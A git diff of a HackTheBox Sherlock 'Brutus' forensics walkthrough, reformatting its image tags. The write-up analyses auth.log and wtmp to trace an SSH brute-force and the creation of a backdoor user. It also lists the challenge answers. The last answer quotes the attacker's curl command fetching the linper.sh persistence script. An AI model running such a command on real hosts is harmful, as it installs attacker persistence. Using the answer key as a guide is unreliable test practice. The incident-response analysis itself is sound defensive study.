@@ -7,7 +7,7 @@ featured: 'true'
 tag: 'htb,technical'
 ---
 
-<img src="/assets/htb/sherlocks-brutus/asset0.png" alt="Sherlocks Brutus"/>
+![Sherlocks Brutus](/assets/htb/sherlocks-brutus/asset0.png)
 
 # Sherlock Scenario
 HackTheBox - [Sherlocks Brutus](https://app.hackthebox.com/sherlocks/Brutus)
@@ -35,15 +35,15 @@ nvim auth.log
 **2. Upon reviewing the `auth.log` traffic, we can identify ***2 IPs***.**
 
 *203.101.190.9*
-<img src="/assets/htb/sherlocks-brutus/asset1.png" alt="Sherlocks Brutus"/>
+![Sherlocks Brutus](/assets/htb/sherlocks-brutus/asset1.png)
 
 *65.2.161.68*
-<img src="/assets/htb/sherlocks-brutus/asset2.png" alt="Sherlocks Brutus"/>
+![Sherlocks Brutus](/assets/htb/sherlocks-brutus/asset2.png)
 
 **3. Notice that first IP `203.101.190.9` login single time unlike second IP `65.2.161.68`.**
 **4. Another thing , Notice that `65.2.161.68` able to login after so many *failed attempts*. Indicates that suspect is trying to brute force into.**
 
-<img src="/assets/htb/sherlocks-brutus/asset3.png" alt="Sherlocks Brutus"/>
+![Sherlocks Brutus](/assets/htb/sherlocks-brutus/asset3.png)
 
 >[!RESULT]
 > 1st Task --> ANS: 65.2.161.68
@@ -56,7 +56,7 @@ What is the username of this account?***
 
 **1. Notice that, suspect did a brute force attack and was successful for user `root`.**
 
-<img src="/assets/htb/sherlocks-brutus/asset4.png" alt="Sherlocks Brutus"/>
+![Sherlocks Brutus](/assets/htb/sherlocks-brutus/asset4.png)
 
 >[!RESULT]
 > 2nd Task --> ANS: root
@@ -73,16 +73,16 @@ cat auth.log | grep "session opened" | grep "root"
 ```
 </CodeBlock>
 
-<img src="/assets/htb/sherlocks-brutus/asset5.png" alt="Sherlocks Brutus"/>
+![Sherlocks Brutus](/assets/htb/sherlocks-brutus/asset5.png)
 
 **2. Check first Accepted password by `65.2.161.68`.**
-<img src="/assets/htb/sherlocks-brutus/asset6.png" alt="Sherlocks Brutus"/>
+![Sherlocks Brutus](/assets/htb/sherlocks-brutus/asset6.png)
 
 >[!NOTE]
 > Note that , as its first instance , it means its the result of brute force attack. Suspect yet did'nt logged in manually.
 
 We need to find second instance.
-<img src="/assets/htb/sherlocks-brutus/asset7.png" alt="Sherlocks Brutus"/>
+![Sherlocks Brutus](/assets/htb/sherlocks-brutus/asset7.png)
 
 **3. Cross check result of cat and second instance.**
 
@@ -102,7 +102,7 @@ What is the session number assigned to the attacker's session for the user accou
 **1. Check logs around `Mar 6 06:32:44`.**
 
 We will find session number there i.e. 37.
-<img src="/assets/htb/sherlocks-brutus/asset8.png" alt="Sherlocks Brutus"/>
+![Sherlocks Brutus](/assets/htb/sherlocks-brutus/asset8.png)
 
 >[!RESULT]
 > 4rd Task --> ANS: 37
@@ -121,7 +121,7 @@ cat auth.log | grep "groupadd"
 </CodeBlock>
 
 As we can see new user `cyberjunkie` was added to group `gshadow`.
-<img src="/assets/htb/sherlocks-brutus/asset9.png" alt="Sherlocks Brutus"/>
+![Sherlocks Brutus](/assets/htb/sherlocks-brutus/asset9.png)
 
 >[!RESULT]
 > 5rd Task --> ANS: cyberjunkie
@@ -153,7 +153,7 @@ last -f wtmp
 </CodeBlock>
 
 We can see time interval `12:02 - 12:07`
-<img src="/assets/htb/sherlocks-brutus/asset10.png" alt="Sherlocks Brutus"/>
+![Sherlocks Brutus](/assets/htb/sherlocks-brutus/asset10.png)
 
 >[!RESULT]
 > 7th Task --> ANS: 279 sec
@@ -172,7 +172,7 @@ cat auth.log | grep "COMMAND"
 </CodeBlock>
 
 We can see that suspect has downloaded and ran the script.
-<img src="/assets/htb/sherlocks-brutus/asset11.png" alt="Sherlocks Brutus"/>
+![Sherlocks Brutus](/assets/htb/sherlocks-brutus/asset11.png)
 
 >[!RESULT]
 > 8th Task --> ANS: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
